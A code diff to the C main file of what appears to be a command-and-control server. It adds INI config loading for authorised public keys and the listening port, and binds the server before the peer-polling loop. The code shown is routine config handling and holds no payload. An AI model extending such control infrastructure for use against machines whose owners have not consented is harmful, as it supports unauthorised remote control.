@@ -2,14 +2,51 @@
 
 #include "ltask.h"
 #include "cnc.h"
+#include "ini.h"
 
 struct sLaika_taskService tService;
 
-int main(int argv, char **argc) {
+static int iniHandler(void* user, const char* section, const char* name, const char* value) {
+    struct sLaika_cnc* cnc = (struct sLaika_cnc*)user;
+
+    #define MATCH(s, n) strcmp(section, s) == 0 && strcmp(name, n) == 0
+    if (MATCH("auth", "public-key-entry")) {
+        laikaC_addAuthKey(cnc, value);
+    } else if (MATCH("server", "port")) {
+        cnc->port = atoi(value);
+    } else {
+        return 0;  /* unknown section/name, error */
+    }
+    return 1;
+}
+
+bool loadConfig(struct sLaika_cnc *cnc, char *config) {
+    int iniRes;
+
+    printf("Loading config file '%s'...\n", config);
+    if ((iniRes = ini_parse(config, iniHandler, (void*)cnc)) < 0) {
+        switch (iniRes) {
+            case -1: printf("Couldn't load config file '%s'!\n", config); break;
+            case -2: printf("Memory allocation error :/\n"); break;
+            default:
+                printf("Parser error on line %d in config file '%s'!\n", iniRes, config);
+        }
+        return false;
+    }
+
+    return true;
+}
+
+int main(int argv, char *argc[]) {
     struct sLaika_cnc *cnc = laikaC_newCNC(atoi(LAIKA_CNC_PORT));
+
+    /* load config file */
+    if (argv >= 2 && !loadConfig(cnc, argc[1]))
+        return 1;
 
     laikaT_initTaskService(&tService);
 
+    laikaC_bindServer(cnc);
     while (true) {
         laikaC_pollPeers(cnc, laikaT_timeTillTask(&tService));
         laikaT_pollTasks(&tService);
